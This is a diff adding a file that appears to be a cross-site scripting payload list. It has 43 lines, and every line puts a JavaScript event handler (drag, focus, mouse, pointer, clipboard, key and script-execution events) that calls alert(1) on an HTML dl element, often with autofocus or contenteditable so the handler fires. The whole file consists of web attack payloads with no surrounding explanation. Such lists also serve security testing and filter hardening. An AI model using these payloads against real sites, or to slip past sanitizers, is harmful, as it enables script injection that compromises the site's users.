@@ -1,0 +1,43 @@
+<dl draggable="true" ondrag="alert(1)">test</dl>
+<dl draggable="true" ondragend="alert(1)">test</dl>
+<dl draggable="true" ondragenter="alert(1)">test</dl>
+<dl draggable="true" ondragleave="alert(1)">test</dl>
+<dl draggable="true" ondragstart="alert(1)">test</dl>
+<dl id=x tabindex=1 onactivate=alert(1)></dl>
+<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
+<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
+<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
+<dl id=x tabindex=1 onfocus=alert(1)></dl>
+<dl id=x tabindex=1 onfocusin=alert(1)></dl>
+<dl onafterscriptexecute=alert(1)><script>1</script>
+<dl onbeforecopy="alert(1)" contenteditable>test</dl>
+<dl onbeforecut="alert(1)" contenteditable>test</dl>
+<dl onbeforepaste="alert(1)" contenteditable>test</dl>
+<dl onbeforescriptexecute=alert(1)><script>1</script>
+<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onclick="alert(1)">test</dl>
+<dl oncontextmenu="alert(1)">test</dl>
+<dl oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<dl oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<dl ondblclick="alert(1)" autofocus tabindex=1>test</dl>
+<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onkeydown="alert(1)" contenteditable>test</dl>
+<dl onkeypress="alert(1)" contenteditable>test</dl>
+<dl onkeyup="alert(1)" contenteditable>test</dl>
+<dl onmousedown="alert(1)">test</dl>
+<dl onmouseenter="alert(1)">test</dl>
+<dl onmouseleave="alert(1)">test</dl>
+<dl onmousemove="alert(1)">test</dl>
+<dl onmouseout="alert(1)">test</dl>
+<dl onmouseover="alert(1)">test</dl>
+<dl onmouseup="alert(1)">test</dl>
+<dl onmousewheel=alert(1)>requires scrolling
+<dl onpaste="alert(1)" contenteditable>test</dl>
+<dl onpointerdown=alert(1)>XSS</dl>
+<dl onpointerenter=alert(1)>XSS</dl>
+<dl onpointerleave=alert(1)>XSS</dl>
+<dl onpointermove=alert(1)>XSS</dl>
+<dl onpointerout=alert(1)>XSS</dl>
+<dl onpointerover=alert(1)>XSS</dl>
+<dl onpointerrawupdate=alert(1)>XSS</dl>
+<dl onpointerup=alert(1)>XSS</dl>
